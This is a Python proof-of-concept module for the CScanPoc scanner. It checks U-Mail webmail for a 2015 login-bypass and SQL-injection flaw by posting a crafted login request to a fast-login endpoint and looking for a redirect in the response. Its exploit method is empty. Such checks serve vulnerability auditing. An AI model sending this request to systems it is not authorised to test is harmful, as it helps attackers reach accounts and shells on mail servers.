# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'U-Mail_0002' # 平台漏洞编号，留空
    name = 'U-Mail邮件系统 SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-01-21'  # 漏洞公布时间
    desc = '''
        该邮件系统存在任意用户登录、且存在注入，从而可以无限制完美getshell（getshell过程只需简单三个请求）。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'U-Mail'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '9af15cd2-bdf2-4ca6-ab05-b56cd23f90cd'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            postdata = 'mailbox=test@domain.com&link=?'
            verify_url = self.target + '/webmail/fast/index.php?module=operate&action=login'
            r = requests.post(verify_url, data=postdata)
            
            if r.status_code == 200 and '<meta http-equiv="refresh" content="0; URL=index.php">' in r.content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
